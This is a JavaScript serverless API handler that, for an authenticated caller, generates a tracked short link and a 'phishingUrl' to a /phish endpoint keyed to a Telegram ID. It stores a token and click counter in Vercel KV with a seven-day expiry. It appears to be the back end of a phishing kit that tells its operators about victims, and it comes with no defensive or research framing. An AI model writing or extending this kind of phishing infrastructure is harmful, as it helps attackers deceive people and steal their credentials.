import crypto from 'crypto';
import { kv } from '@vercel/kv';

// Authentication middleware
const authenticate = (req) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return false;

  const [bearer, token] = authHeader.split(' ');
  return bearer === 'Bearer' && token === process.env.API_SECRET;
};

export default async (req, res) => {
  // Validate method
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Validate auth
  if (!authenticate(req)) {
    return res.status(401).json({
      error: 'Unauthorized',
      message: 'Invalid or missing API secret'
    });
  }

  try {
    const { telegramId, redirectUrl } = req.body;

    if (!telegramId || !redirectUrl) {
      return res.status(400).json({
        error: 'Missing parameters',
        required: ['telegramId', 'redirectUrl']
      });
    }

    const token = crypto.randomBytes(32).toString('hex');
    const shortCode = crypto.randomBytes(3).toString('hex');

    await kv.set(`link:${shortCode}`, {
      telegramId,
      originalUrl: redirectUrl,
      token,
      clicks: 0,
      createdAt: Date.now()
    }, { ex: 604800 }); // expires in 7 days

    const baseUrl = `https://${req.headers.host}`;

    res.status(200).json({
      success: true,
      shortUrl: `${baseUrl}/s/${shortCode}`,
      phishingUrl: `${baseUrl}/phish?token=${token}`,
      expiresAt: new Date(Date.now() + 604800 * 1000).toISOString()
    });

  } catch (error) {
    console.error('API Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};
